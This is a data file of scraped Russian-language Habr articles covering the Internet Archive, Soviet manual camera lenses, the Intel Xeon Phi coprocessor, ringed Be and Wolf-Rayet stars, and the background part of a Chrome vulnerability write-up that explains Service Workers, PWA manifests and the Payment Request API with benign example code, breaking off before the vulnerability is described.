Что касается музыки, то она традиционно имела разнообразные форматы хранения — винил, компакт-диски, кассеты, MP3 и так далее. Особенно Кейла восторгают пластинки, записанные со скоростью 78 оборотов в минуту, которые, по его словам, выпускали примерно с 1900 по 1950 годы. «Всего их примерно 2-3 миллиона. Мы оцифровали примерно 450 тысяч».


Коробки с носителями, за которыми приглядывает картонный Дарт Вейдер.

«По сути, мы стараемся обрабатывать все типы носителей. И мы обнаружили, что всё устаревает, это происходит всё быстрее и быстрее. У нас не только нет доступа к прежним объектам; даже если доступ есть, использовать их не всегда возможно».

Примечание: если вы хотите пожертвовать предметы Архиву Интернета, то изучите список принимаемых им сейчас носителей на странице пожертвований.

Как Архиву удаётся продолжать работу
Кто-то из группы спросил Кейла, как часто АИ нужно покупать новые серверы для сохранения постоянно прибывающего потока новых носителей.

«Непрерывно. Мы покупаем новую пару стоек (потому что они всегда продаются по парам) каждые два-три месяца. Сейчас в одной стойке можно хранить примерно пять петабайтов».


Два предыдущих поколения машин для хранения Архива; слева — StorageTek 9710 (1990-е), справа — PetaBox первого поколения (2004 год).

В этом году Архив Интернета попал в новости из-за юридических атак со стороны как книгоиздательского бизнеса, так и музыкальной индустрии (иск от последней вызван проектом оцифровки пластинок на 78 оборотов в минуту). В процессе экскурсии Кейл сделал множество едких примечаний по поводу этих юридических проблем, но было очевидно, что они повлияли на Архив. «Иск от книгоиздателей до сих пор в суде, и он невероятно дорого нам стоит».

Как же АИ удаётся выживать? Кейл пояснил, что в основном АИ живёт на пожертвования примерно 110 тысяч человек, в среднем переводящих примерно по $5, а также «на средства фондов, переводящих нам серьёзные суммы денег». Ещё АИ предоставляет абонентские услуги библиотекам и другим организациям.

«К тому же мы выживаем благодаря тому, что мало тратим. Вы же заметили, что у серверов нет никакого воздушного кондиционирования? Если становится жарко, мы просто открываем окна. Так что это экологично. Но и экономично тоже».


Снаружи физического Архива Интернета в Ричмонде, штат Калифорния. Увлекательный вечер для фаната истории Интернета!",2024-01-26
Мануальные объективы на цифровых камерах: хорошие кадры за небольшие деньги,40,2,https://habr.com/ru/companies/ruvds/articles/786612/,"
Ещё во времена, когда у меня был старичок Nikon D3100, появилась мысль: а что, если всё-таки попробовать мануальные стёкла и перестать снимать на тёмный китовый 18-55 мм? Мысль появилась как раз в тот момент, когда пришло осознание того, что снимаю я преимущественно портретные кадры. И мысль-то оказалась здравая: «Гелиос» должен быть у каждого!

Конечно, в первую очередь речь идёт о советских объективах. Цены на тот же Гелиос 44 (в разных модификациях, отличающихся, по сути, лишь дизайном корпуса и иногда картинкой) — самый массовый советский объектив, который комплектовался не менее массовыми зеркалками «Зенит» разных моделей — это два обеда во «Вкусно и точка». И несмотря на свою стоимость, он рисует очень красивую картинку: портреты снимать на него очень приятно.

Первый опыт съёмки на Гелиос 44-2 произошёл ещё на пресловутом «Никоне». Объектив даёт мягкую текстуру кожи и очень красивое боке: первая съёмка с этим стеклом прошла очень удачно, в новогодних московских инсталляциях с праздничными огоньками. Увы, без адаптера с дополнительным стеклом, компенсирующим рабочий отрезок, нет бесконечности, поэтому портреты получились довольно крупными. Но мне всё равно нравится результат.

Найти объектив можно примерно за 1000 рублей — зачастую их продают с камерами (правда, они в большинстве случаев нерабочие).

Гелиос 44-2 на Fujifilm X-T1 выглядит немного нелепо из-за дизайна как самого объектива, так и переходника

Примеры фото
Fuji X-T1, Гелиос 44-2. Без бленды традиционно выдаёт дымку, но, как мне кажется, с ней получаются более «воздушные» кадры

Fuji X-T1, Гелиос 44-2. Кадр снят со студийным постоянным светом

Nikon D3100, Гелиос 44-2. За счёт приличной светосилы получилось отснять фотосет даже поздно вечером


▍ «Гелиосы» бывают разные
А потом я узнал, что оказывается, был и собрат — МС Гелиос 81н. «МС» в названии означает «мультипросветление», то есть такой вариант даёт картинку чуть лучше, чем простой 81. Сходство лишь в названии: фактически, это абсолютно другой объектив, рисующий другую картинку. Кручёное боке имеет несколько другой характер, а снимки выходят более резкие. И главное — в нём байонет «Н». Да, это локализованная буква N. Просто в Союзе решили сделать свои «Никоны», выпустив три «Киева» — 17, 18 и 20. Байонет не полностью совместим с оригинальным Nikon F – ставить «Гелиос 81» на старые плёночные камеры, типа Nikon F4, не стоит, ибо снять с камеры его будет потом крайне проблематично. На некоторые «Никоны» объектив попросту не встанет из-за конструкции корпуса самого «Гелиоса». Но умельцы стачивают часть корпуса, и объектив нормально работает. Как вариант, можно поискать этот «Гелиос» без серийного номера у передней линзы, либо его собрат Arsat H. 

К счастью, на бюджетный D3100 81н встал как родной без каких-либо модификаций. Всё такая же большая светосила f/2 и приличная резкость на открытой диафрагме делают его одним из лучших портретных стёкол в бюджетном сегменте. Да, он мануальный. Но попасть в фокус просто даже без фокус-пикинга.

С «Гелиосом 81» я прошёл несколько фестивалей, но так вышло, что наступил Ковид, и все мероприятия резко отменили. Старичка D3100 я использовал разве что лишь по работе, снимая репортажные кадры. Но всегда хотелось камеру посерьёзнее, ведь опыта в съёмках уже предостаточно. Ну а поскольку уже тогда я тяготел к плёночной фотографии, то хотелось бы иметь камеру, имеющую «плёночный» дизайн. И выбор пал на уже на тот момент старенькую, но очень хорошо зарекомендовавшую себя модель Fujifilm X-T1. ISO, выдержка, поправка экспозиции — всё это ставится с дисков, как на старых камерах (что, кстати, очень удобно — привет, Sony!). И первым же аксессуаром, купленным для новой камеры, стал переходник с Nikon F на байонет Fijifilm X. На «Фудже» старый объектив продолжил служить мне и дальше — фокус-пикинг очень помогает наводиться на резкость, снимать стало ещё комфортнее. Сколько классных кадров было сделано благодаря этому красавцу — боюсь даже представить. По цене, конечно, он может стоить дороже — вполне реально урвать вариант за 1500-2000 рублей.

Вариант с «Гелиосом 81н» смотрится как-то более гармонично

Примеры фото
Nikon D3100, МС Гелиос 81н. Очень резкая картинка, портреты снимать — одно удовольствие

Fuji X-T1, МС Гелиос 81н. Кадр сделан без дополнительных источников света, в новогодних декорациях ЦДМ. Боке от этих самых декораций — просто шикарное

Fuji X-T1, МС Гелиос 81н. А вот контрового света объектив боится

Fuji X-T1, МС Гелиос 81н. Иногда, как мне кажется, можно побаловаться с цветокором, чтобы получить кадр с эффектом старой плёнки


▍ Мануальные зумы — менее бюджетно и не для всех
Какое-то время спустя мне попался за бесценок в идеальном состоянии хороший мануальный зум — Canon FD 70-210 f/4. Довольно резкий и светосильный на всех фокусных расстояниях. Главная проблема этого объектива — в его конструкции. Это так называемый «тромбон»: и зум, и фокус расположены на одном кольце. Сбить фокус и получить нечёткий кадр на таком — проще простого, потому нужно очень серьёзно приноровиться к использованию такого стекла. И тем не менее, даже с мануальным фокусом получилось сделать классные кадры: косплей-сцену на фестивалях от VK снимал именно им. Конечно, без автофокуса очень тяжело, но опять же, если приноровиться, можно и наделать годных кадров. Главный плюс — хорошая светосила. 
И учитывая рыночную стоимость в 5000-6000 рублей, советовать его не особо хочется. Уж лучше взять фикс на 135 мм советского производства, выйдет куда дешевле.

Не самая удобная штука, скажу я вам

Примеры фото
Fuji X-T1, Canon FD 70-210. Сцену снимать довольно удобно (но лучше пользоваться моноподом для таких съёмок, чтобы не держать камеру на весу)

Fuji X-T1, Canon FD 70-210. Причём можно даже портретные снимки — прямо на сцене

Fuji X-T1, Canon FD 70-210. А впрочем, и вне сцены — тоже неплохо себя проявляет


▍ «Компактиш», но не всегда «практиш» и «гут»
Один из моих любимых, но редко используемых объективов — Индустар-69. Маленький 28 мм блинчик со светосилой F/2.8 будто создан для съёмки на «Фуджах». Изначально он стоял на полукадровых камерах «Чайка-2» и «Чайка-3», но благодаря тому, что он съёмный и имеет резьбу М39, то легко встаёт на современные беззеркалки. Однако он не кроет полный кадр, ибо изначально делался для кропнутой плёночной камеры. И да, фокусные расстояния не совпадают со стандартными M39 — на каких-то камерах бесконечности не будет совсем. На Fijifilm будет, но при условии, если будут выкручены стопорные винты, и геликоид будет свободно выходить из корпуса, чтобы попадать в бесконечность. 

Кадры же на «Индустар» получаются крайне интересные: он тоже крутит боке, а попасть в резкость сложно. Да и резкость в принципе есть лишь по центру кадра. Снимать на него нужно с полным пониманием специфичности картинки, которая здесь получается очень «плёночной». При желании можно даже портреты поснимать! 

А вот пейзажные кадры на него получаются «плёночные» — с весьма характерной размытостью по краям на открытой диафрагме. И да, виньетка всё же даже на кроп-сенсоре видна, хоть и не так сильно выраженная.

Индустар-69 проще купить с самой камерой. «Чайка-2» и «Чайка-3» в среднем стоят около 1000 рублей. Причём камеры рабочие — можете даже попробовать что-то поснимать на них, благо они полукадровые, плёнку хорошо сэкономить можно.

Без батарейного блока и с этим маленьким блинчиком камера легко помещается в карман рюкзака

Примеры кадров
Fuji X-T1, Индустар-69. Хорошо видно нерезкость по краям

Fuji X-T1, Индустар-69. Пейзажи снимать можно, но картинка получается довольно сюрреалистичная

Fuji X-T1, Индустар-69. А вот и кручёное боке при хорошей резкости посередине

Fuji X-T1, Индустар-69. Не поверите, но и этот кадр сделан тоже на широкоугольный «блинчик» — обратите внимание на резкость в области глаз!


Наверное, стоит сказать про переходники: стоят они примерно от 800 рублей, разве что какие-нибудь топовые от K&F могут оцениваться от 2000 и выше (на объективе от Canon стоял как раз переходник от K&F, и он был правда хорош — хорошее качество сборки и возможность блокировки диафрагмы). Но на деле разница в качестве вообще не заметна — все они металлические, хорошо собраны. Так что выбирайте под свой бюджет и ориентируйтесь на отзывы на маркетплейсах.

Я всё это к чему? Даже с небольшим бюджетом и прямыми руками можно делать классные кадры. Кстати, сама камера обошлась мне в 20 000 рублей, и она всё ещё одна из лучших в своём ценовом сегменте. На Гелиос 81н лично снимал даже коммерцию — получалось очень круто.

Старые мануальные объективы требуют определённой сноровки при съёмке, зато способны подарить достойные кадры при минимальных затратах. Сами кадры нередко получаются с «плёночным» характером за счёт устаревшей конструкции самих объективов. И если хочется эффект усилить, есть немало «плёночных» пресетов для того же Lightroom. Хотя, никто не запрещает экспериментировать с кривыми.

А нацепив на «Фуджи» тот же «Индустар-69», вы спокойно можете влиться в модные тусовочки на каком-нибудь модном «Флаконе» или «Артплее», ещё и спросят, уж не на плёнку ли вы снимаете?

Скидки, итоги розыгрышей и новости о спутнике RUVDS — в нашем Telegram-канале 🚀",2024-01-26
"Рыцарь-демон, Intel Xeon Phi в 2024-м, часть 0",36,0,https://habr.com/ru/articles/788790/,"Изображение НЕ сгенерировано нейросетьюВы точно знаете о процессорах Intel. Вероятно, вы что-то слышали о видеокартах Intel. Но об этом устройстве не знает никто (effectively никто). Триста ватт, двести пятьдесят ядер, архитектура x86 (почти). Это чудовище из 2014-го зовут Intel Knights Corner или же Intel Xeon Phi... и это карта-сопроцессор для слота PCI-E.Ленивая охота за этим устройством на просторах барахолок длилась пару лет. После бума китайских ""материнок"" для Xeon E5 v3 хотелось ещё более странного. Дзынь. Немного безналичных денег и девайс ждёт в пункте выдачи. Тяжёлый. Чувствуется запах гари (да не умер он в Запретном лесу). Но ведь продавец убеждал, что всё работает. Любопытство победило жадность. Поверим продавцу, чем чёрт не шутит.Из системных требований только 400 ватт мощности блока питания и наличие включенной опции Above 4G Decoding (она же ReBAR). Вставил и забыл... нет, не забыл, забыть об этом турбинном пылесосе невозможно. Впрочем, он явно рассчитан на серверное применение, поэтому просто вынесем его на балкон. Греется даже ""на холостых"".Реальных ядер показывает 61 штуковК сожалению, через Thunderbolt во внешнем боксе для видеокарт оно не заработало, учитывайте это перед приобретением. Предложения на барахолках появляются иногда, ловите момент. Кстати, судя по внешнему виду (в интернете карта синяя, а мой вариант серый) мне достался инженерный образец. Производитель строго запретил майнинг на этом устройстве. Хорошо, что мы уже в 2024-м, соблазн невелик.Если не пересказывать долго рекламные статьи, Intel Xeon Phi это такой мини-компьютер, в нём 200 виртуальных вычислительных ядер и 8/16 гигабайт оперативной памяти. Этот мини-компьютер запускает внутри себя GNU/Linux и ждёт, попутно он создаёт для хост-машины сетевой адаптер на 40 гигабит/сек. Этого хватает, чтобы программы, скомпилированные особым образом могли выгружать инструкции и данные в память устройства и запускать их там в режиме массового параллельного исполнения на всех этих ядрах. И всё должно было быть быстро. Очень быстро.Чтобы эта схема работала, нужен фирменный компилятор Intel. Его не так легко найти, ведь поддержка устройства закончилась. Помог web.archive.org, три часа (очень медленной) загрузки и дистрибутив с драйверами у меня. Ещё некоторое время и старая версия Intel Parallel Studio XE 2017 тоже в наличии. Хост-машина на Windows, извините.РаботаетСкучную часть пропустим. Устройство действительно работает, сетевой адаптер активен, пинг идёт. Работает доступ по SSH. Немного сетевой магии netsh и работает интернет, локальная сеть и даже монтирование NFS. Всё что нужно для восхода солнца вручную. Такой вариант использования тоже предполагался, прямая загрузка и запуск программ через ssh.К сожалению, Visual Studio 2017 (совместимость с которой обещали авторы дистрибутива Intel Parallel Studio) отказалась видеть компилятор Intel, поэтому пока я смог скомпилировать только самую простую программу и только в консоли. Но она реально работает, пишет в консоли Xeon Phi заветную строку ""Hello, World!"".Привет, мир!В устройстве нет постоянной памяти для пользовательских данных, поэтому каждый старт производится фактически с нуля. В этот момент в устройство загружается ""прошивка"" пользовательской файловой системы, состоящая из тех файлов и папок, которые перечислены (вручную, да) в текстовых файлах на хост-машине. Ну, спасибо и на этом.К сожалению (или к счастью) я обычный крудошлёп и очень слабо знаком с экосистемой Си. Наивная надежда, на то, что умные компиляторы из 2017-го сделают всё сами никак не оправдалась. Осталось нереализованным желание скомпилировать под это чудо техники популярный плеер языковых моделей llama.cpp, о котором кто только не писал (и я в том числе). Кажется, что в инференсе бюджетных нейросетей это устройство может найти свою загробную нишу.Отчасти в неудаче ""виноват"" Windows и в самом деле, в интернете многие успешные инструкции относятся к тем случаям, когда на хост-машине установлен CentOS или Debian с особой сборкой компилятора gcc. Это и был следующий шаг в моём плане по окормлению старого рыцаря в углу (Knights Corner, кодовое название устройства), но как только я решился на дальнейшие эксперименты, новогодние каникулы кончились и мне пришлось вернуться в 2024-й, в нём Котлин, Ангуляр и прочие скучные преобразователи времени в зарплату.А если кто-то всё же знает, как скомпилировать llama.cpp под архитектуру mic, пишите в комментариях. Может и на следующую часть материал наберётся, как уже было сказано, чем рыцарь-чёрт не шутит.И самое главное: берегите себя и своих близких.",2024-01-26
Ветер и кольца: об экзотических звёздных классах Be и WR,37,3,https://habr.com/ru/articles/788986/,"Большинство звёзд относится к основным спектральным классам, от бело-голубых O до красных M. Проходя типичную звёздную эволюцию, они укладываются в знаменитую Главную Последовательность, раскинувшуюся по центру диаграммы Герцшпрунга-Расселла. Возможно, данная диаграмма была открыта и описана именно потому, что на данном этапе развития Вселенной в изобилии встречаются звёзды разных спектральных классов. В одной из публикаций я описывал, как диаграмма Герцшпрунга-Рассела может преобразиться в далёком будущем. В той и некоторых последующих статьях я затрагивал тему пекулярных звёзд, выбивающихся из Главной Последовательности прежде всего потому, что в них содержатся элементы тяжелее железа и никеля, которые не могут образоваться при термоядерном синтезе в ходе типичной звёздной эволюции. Пекулярные звёзды с высокой металличностью – удивительный класс объектов, интересовавших ещё Ивана Ефремова. Обнаружены и такие звёзды, вокруг которых не успевает сформироваться планетная система; вместо этого звезда обзаводится обширными кольцами и немного напоминает Сатурн. О таких причудливых объектах мы поговорим под катом.Бывают звёзды окружённые планетами, бывают системы двойных и тройных звёзд, вероятно, бывают даже парные системы из звезды и чёрной дыры. Но это зрелые звёзды, большинство из которых обзавелось планетными системами и вошло в цикл волнообразного колебания активности, подобный 11-летнему солнечному циклу.  Но существует ещё и целый класс молодых горячих голубых звёзд, которые только формируются в звёздных яслях. Звёздные ясли (stellar nursery) – это газопылевая туманность, в которой компактно сосредоточены молодые яркие звёзды, но в целом практически так же холодно, как и в межзвёздном пространстве.По-видимому, молодые звёзды, находящиеся в «яслях» не только существенно отличаются от звёзд главной последовательности по химическому составу (содержат кроме водорода и гелия заметные количества более тяжёлых элементов), но и обладают сильными магнитными полями. Во-первых, поскольку звёзды в яслях расположены компактно, они влияют друг на друга; во-вторых, именно из-за необычного (пекулярного) химического состава звезда мешает формированию планетезималей и в дальнейшем — планет. Можно предположить, что звёзды с необычным химическим составом опознаются по нетипичной форме протопланетного диска или необычного «населения» эклиптики.Теория формирования колец у звёзд спектрального класса BeТак выглядит голубая звезда спектрального подкласса Be. Это один из видов звёзд, ещё не вышедших в главную последовательность. Звёзды Be обладают эффективной температурой от 10 000 до 30 000 K и светимостью III-V класса. Таким образом, по температуре они не уступают голубым сверхгигантам, но по размеру и объёму сверхгигантами не являются. Первой известной звездой такого рода считается гамма Кассиопеи, которую исследовал в 1866 году итальянский астроном Анджело Секки. Он обнаружил в непосредственной близости от неё вещество, дававшее на спектрографе эмиссионные линии – таким образом, он заключил, что эта звезда окружена не столь жаркой газовой оболочкой.  Звезда выглядит приплюснутой, так как быстро вращается и, согласно современным представлениям, время от времени выбрасывает порции звёздного вещества. Из этого вещества в экваториальной плоскости звезды образуется газовый диск, в котором формируются пузыри газа. Между этими пузырями неизбежно возникают столкновения, в упрощённом виде пузыри демонстрируют такую физику:Выравнивается распределение углового моментаВыравнивается распределение скоростиРассеивается динамическая энергия Все эти факторы способствуют образованию околозвёздных колец, которые могут занимать несколько орбит.Поскольку извергаемое вещество распределяется по орбитам на разных расстояниях от Be-звезды, отличается скорость вращения колец и степень их ионизации. Эти отличия также хорошо заметны в самом эмиссионном спектре. Пока звезда продолжает выбрасывать вещество в окружающее пространство, оболочка не стабилизируется, в ней будет сохраняться турбулентность с активным образованием пузырей и их перемешиванием, но не будут возникать планетезимали (зачатки планет). Ширина и активность перемешивания вещества в кольце будет во многом зависеть от его химического состава и скорости вращения. Система колец будет генерировать явственное магнитное поле, сила которого, однако, будет колебаться, а само магнитное поле – фиксироваться в широкой окрестности звезды. Поэтому звезда с магнитными кольцами должна явственно отличаться от пульсара или магнетара как по силе, так и по распределению магнитного поля (магнетар, будучи остатком нейтронной звезды, должен фиксироваться как значительно более мощный точечный источник магнитного поля). Звёзды Вольфа-РайеЭто редкий класс сверхкрупных звёзд, представляющих собой специфическую позднюю стадию в развитии некоторых голубых гигантов. На Хабре звёзды Вольфа-Райе рассмотрены в замечательной статье уважаемого @GreenRediska. Такие звёзды названы в честь  Шарля Вольфа и Жоржа Райе, впервые исследовавших их эмиссионные спектры в 1867 году. В Млечном Пути известно около 1000 таких звёзд, как правило, входящих в двойные системы, где вторая звезда – это голубой гигант класса B. Светимость звёзд Вольфа-Райе может в миллионы раз превышать солнечную, поэтому они уже обнаружены даже в галактике Андромеда, где таких звёзд известно около 30. Типичная звезда Вольфа-Райе (в астрономической номенклатуре их принято обозначать аббревиатурой WR+номер) – WR31a в созвездии Киля.В таких звёздах гелия больше, чем водорода, а наряду с гелием в большом количестве содержатся более тяжёлые элементы, в частности, углерод. Поскольку звезда Вольфа-Райе является компонентом двойной системы, значительная часть её звёздного вещества выдувается в окружающее пространство под действием солнечного ветра, а также перетекает на звезду-компаньон. Именно поэтому звёзды Вольфа-Райе также в большей степени располагают к образованию колец. Динамику и спектр таких колец удалось в деталях изучить у звезды WR 140 (расположенной примерно в 5600 световых лет от Солнца), качественные снимки которой космический телескоп «Джеймс Уэбб» получил летом 2022 года. Кольца вокруг гигантовСистема WR 140 состоит из двух массивных звёзд. Одна из них — голубой гигант спектрального класса O. Другая – собственно, звезда Вольфа-Райе, постоянно отбрасывающая в окружающее пространство облака водорода с примесью более тяжёлых элементов, в особенности углерода и азота. Два гиганта на очень близком расстоянии обращаются вокруг общего центра масс, совершая оборот менее чем за восемь лет.Обе эти звезды обдувают друг друга сильнейшим встречным солнечным ветром, и на месте смешения потоков элементарных частиц образуются бурно вращающиеся потоки космической пыли, зафиксированные телескопом «James Webb» как система незамкнутых колец:    Кольца вращаются, то есть, по всей видимости, всё-таки являются замкнутыми, но с одной из сторон двойной системы они гораздо ярче, чем с другой (наиболее активная конденсация пыли наблюдается в левой части снимка). Сопоставляя данные с «James Webb» и с наземных телескопов, можно заключить, что система из 17 ярких колец у WR 140 имеет радиус около одного светового года. Вероятно, более тусклые кольца могут пролегать и дальше от звезды.Как могли образоваться кольцаТеоретически, вся конфигурация колец и, в том числе, их асимметрия, должна объясняться орбитальными взаимодействиями двух звёзд. В 2022 году группа астрономов под руководством Райана Лау из обсерватории NOIRlab, Тусон, штат Аризона, построила модель, согласно которой наблюдаемые кольца образовались примерно за 130 лет, а на внутренних орбитах постоянно продолжают формироваться новые кольца, вытесняющие старые на периферию. Остывающее звёздное вещество постоянно удаляется в стороны от двойной звезды со скоростью около 2600 километров в секунду, подобно тому, как айсберги расплываются от Антарктиды. Эти кольца выдувает на периферию системы звёздный ветер.  Лау указывает, что двойные звёзды с концентрическими пылевыми кольцами не так уж и редки, их известно около 15 таких систем.  Но именно благодаря тому, с какой детализацией удалось рассмотреть WR 140, было выяснено, что кольца не только совершают орбитальное движение, но и постоянно отдаляются от родительской звезды под напором более свежих и горячих колец. Учитывая,  что звезда Вольфа-Райе в WR 140 активно извергает углерод, кольца ожидаемо богаты органическими соединениями. Химические датчики Уэбба позволяют предположить, что эта химическая смесь очень разнообразна, и ни одно из веществ заметно не выделяется на фоне всей совокупности. Тем не менее, там определённо много полициклических ароматических углеводородов – бензола и его производных. Насколько известно из лабораторных моделей, такие молекулы действительно активно формируются под действием жёсткого излучения в среде, перенасыщенной углеродом и сравнительно бедной водородом. Магнитные поля звёзд невозможно наблюдать и измерять напрямую, но наличие (а также сила и форма) этих магнитных полей уверенно выводится по спектральной сигнатуре  колец. По-видимому, ближние кольца у WR-звёзд наряду с большим количеством углерода содержат азот, а их температура может достигать 50 000 кельвинов – вдвое выше, чем на поверхности звезды. Если бы газ просто рассеивался, то он должен был бы остывать, поэтому должен быть фактор, способствующий такому  разогреву (при котором азот даже светится в видимом спектре). Предположительно, таким фактором может быть магнитное поле звезды. Если у звезды сильное магнитное поле, оно должно отражаться на форме потоков солнечного ветра. Потоки заряженных частиц не будут распространяться во всех направлениях равномерно. Самый тяжёлый химический элемент, образующийся в звёздах при обычном термоядерном синтезе – это железо (если не считать следовых количеств никеля). Звезда с сильным магнитным полем должна постепенно накапливать атомы железа на полюсах. В таком случае, сигнатура её «солнечного ветра» в полярных областях будет отличаться высоким содержанием железа, а в «средних широтах» будут преобладать атомы углерода и азота.   Немного фантазииЯ решил развёрнуто описать ситуацию с системами колец у горячих звёзд классов Be и WR, подумав, что они могли бы привлечь космическую сверхцивилизацию, желающую освоить заполнение орбит искусственными планетами с нуля. Фактически, окрестности WR-звезды заполнены ровным слоем важнейших элементов, из которых можно было бы «конденсировать» железокаменные планеты на нужном расстоянии от светила, в условной «зоне обитаемости». Магнитное поле служит «сеткой» для прокладки орбит, теоретически, его силой и ориентацией можно управлять. В результате складываются условия для создания искусственной планетной системы. Гипотетическая система с 416 планетами в зоне обитаемости описана в статье Шона Реймонда, перевод которой я однажды публиковал в этом блоге. Нуклеацию планет и обрастание их ядер звёздным веществом можно было бы организовать на максимально комфортных и безопасных орбитах, в том числе, укладывая на одной орбите по несколько планет или создавая парные планеты, обращающиеся вокруг общего центра масс. Более того, в одной системе можно было бы сделать как минимум две пересекающиеся эклиптики, подобные той конфигурации протопланетных облаков, которую «Джеймс Уэбб» недавно обнаружил у звезды бета Живописца.Странно, что пока никто не догадался поискать в Галактике такое астроинженерное сооружение или хотя бы написать о нём фантастический роман.",2024-01-26
История одной уязвимости в Google Chrome,33,0,https://habr.com/ru/articles/789060/,"Статья имеет ознакомительный характер и предназначена для специалистов по безопасности, проводящих тестирование в рамках контракта. Автор не несет ответственности за любой вред, причиненный с применением изложенной информации. Распространение вредоносных программ, нарушение работы систем и нарушение тайны переписки преследуются по законуПредисловиеЭта статья посвящена уязвимости, которую мне удалось обнаружить в браузере Google Chrome в конце прошлого года, а также рассказывает об истории её возникновения. Уязвимость существовала в течение продолжительного периода и была устранена 31 октября 2023 года.Компания Google оценила её в 16000$ В данной статье в начале будет описан ряд современных технологий, применяемых в веб-разработке, что является необходимым для полного понимания контекста появления выявленной уязвимости. В случае, если ваш интерес сосредоточен исключительно на минимальной демонстрационнии (PoC), рекомендуется сразу перейти к разделу ""Уязвимость"".Service WorkerНачну с изложения об одной из моих любимых технологий - Service Worker. Этот инструмент представляет собой своего рода прокси между вашим браузером и сетью, обеспечивая возможность полного контроля над всеми исходящими запросами с вашего веб-сайта (и на него) в интернете, а также управления кэшированием.Типичный workflow, таков:Со страницы нашего веб сайта регистрируем воркер:script.js   if ('serviceWorker' in navigator) {
   navigator.serviceWorker.register('/service-worker.js')
     .then(function(registration) {
       console.log('Service Worker registration successful with scope: ', registration.scope);
     })
     .catch(function(error) {
     console.log('Service Worker registration failed: ', error);
   });
 }
Простой пример воркера:  self.addEventListener('fetch', function(event) {
  event.respondWith(function_that_returnedResponse());
});
Следовательно, при каждом запросе к нашему сайту, будь то запрос на изображение или fetch-запрос из JavaScript, он будет направляться через Service Worker. Результат запроса будет возвращаться с использованием предварительно зарегистрированного обработчика.Это действительно мощный инструмент веб-разработки (для интереса, вы можете посетить chrome://inspect/#service-workers и увидеть множество Service Worker'ов, используемых в данный момент в вашем браузере).Однако, вместе с своей эффективностью, эта технология также вносит ряд проблем. Многие архитектурные решения в веб-приложениях (и даже в браузерах) иногда разрабатываются без учета этой технологии, что приводит к появлению уязвимостей.PWAProgressive Web Application (PWA) – это технология, которая позволяет эмулировать установку веб-сайта на устройство пользователя. Ее создание было направлено на упрощение задач разработчиков, предоставляя возможность обходить необходимость в разработке нативных приложений, если это возможно.PWA тесно взаимосвязаны с концепцией Service Worker, предоставляя возможность реализации функционала так называемых ""офлайн режимов"". Это позволяет пользователям сохранять функциональность веб-сайта даже при отсутствии подключения к интернету.Для регистрации PWA был разработан стандарт Web App Manifest. Коротко говоря, это специальный JSON-файл, примерная структура которого представлена ниже:{
  ""short_name"": ""My App"",
  ""name"": ""My App"",
  ""icons"": [{
    ""src"": ""https://www.myapp.example/icon.svg""
  }],
  ""start_url"": ""."",
  ""display"": ""standalone"",
  ""background_color"": ""#fff"",
  ""description"": ""Slonser example"",

}
В этом файле указываются основные данные приложения. При первом посещении PWA, страница использует скрипт, аналогичный тому, который был показан в предыдущем разделе, для загрузки Service Worker.PaymentsСпецификация от 8 сентрября 2022 года утверждает следующее (в вольном переводе):Эта спецификация описывает API, который позволяет пользовательским агентам (например, браузерам) выступать в качестве посредника между тремя сторонами в транзакции:

Получатель платежа: торговец, который ведет онлайн-магазин, или другая сторона, которая просит оплаты.
Плательщик: сторона, которая совершает покупку в этом интернет-магазине и которая аутентифицирует и авторизует платеж по мере необходимости.
Способ оплаты: средство, которое плательщик использует для оплаты получателю (например, платеж картой или кредитный перевод). Провайдер способа оплаты устанавливает экосистему для поддержки данного способа оплаты.
Из изложенного выше, скорее всего вы ничего не поняли, поэтому покажу на примере:Так же это работает и в Desktop версии Chromium based браузеров:  Что здесь происходит: Пользователь заходит на сайт, который выставляет ему счет.Сайт используя Payments Request API обращается к стороннему ресурсуПользователь видит всплывающее окно со сторонним ресурсомДанный ресурс обрабатывает пользовательский платеж и возвращает исходному ресурсу данные о выполненииНа коде это выглядит примерно так:function buildSupportedPaymentMethodData() {
  // Example supported payment methods:
  return [{ supportedMethods: ""https://example.com/pay"" }];
}

function buildShoppingCartDetails() {
  // Hardcoded for demo purposes:
  return {
    id: ""order-123"",
    displayItems: [
      {
        label: ""Example item"",
        amount: { currency: ""USD"", value: ""1.00"" },
      },
    ],
    total: {
      label: ""Total"",
      amount: { currency: ""USD"", value: ""1.00"" },
    },
  };
}

new PaymentRequest(buildSupportedPaymentMethodData(), {
  total: { label: ""Stub"", amount: { currency: ""USD"", value: ""0.01"" } },
})
  .canMakePayment()
  .then((result) => {
    if (result) {
      // Real payment request
      const request = new PaymentRequest(
        buildSupportedPaymentMethodData(),
        checkoutObject,
      );
      request.show().then((paymentResponse) => {
        // Here we would process the payment.
        paymentResponse.complete(""success"").then(() => {
          // Finish handling payment
        });
      });
    }
  });
То есть со стороны клиента мы:Создаем обьект PaymentRequestПередаем в него адрес обработчика платежа и данные о покупкеВызываем метод show и обрабатываем Promise с результатом/ошибкой.Что же должен делать обработчик платежей?:По переданной ссылке он должен вернуть Link Header:Link: <https://bobbucks.dev/pay/payment-manifest.json>; rel=""payment-method-manifest""
Тут стоит отметить, что в соотвествии с RFC5988 rel=""payment-method-manifest"" отсутсвует. Он будет обрабатываться только в запросах Payments API, и его парсинг написан изолировано от основной реализацииКлиент перейдет по ссылке переданной пунктом ранее и воспримет его содержимое как Payment Manifest, например:{
  ""default_applications"": [""https://alicepay.com/pay/app/webappmanifest.json""],
  ""supported_origins"": [
    ""https://bobpay.xyz"",
    ""https://alicepay.friendsofalice.example""
  ]
}
Тут default_applications указывает на WebAppManifest, который будет установленsupported_origins - указывает на поддерживаемые домены соотвественноJITКак я уже упоминал ранее, Payment App должен использовать Web App Manifest, изначально созданный для простых PWA.Однако перед разработчиками веб-стандартов встала задача налаживания коммуникации между сайтом и платежным приложением. Было принято спорное решение - воспользоваться Service Worker. Для этого к уже существующей концепции воркеров были добавлены новые обработчики событий:self.addEventListener('paymentrequest', async e => {
    //...
});
Однако здесь возникает вопрос: при первом вызове Payment App не содержит Service Worker (поскольку он регистрируется только после первой загрузки страницы), что нарушает логику работы.Эту проблему решили через ещё одно спорное решение - внедрение Just-In-Time (JIT)-installed воркеров. Для этого была расширена спецификация содержимого Web App Manifest. Теперь, если он используется для Payments App, он должен включать поле ""serviceworker"" с указанным воркером для регистрации:  ""serviceworker"": {
    ""src"": ""/download/sw-slonser.js"",
    ""use_cache"": false,
    ""scope"":""/download/""
  }
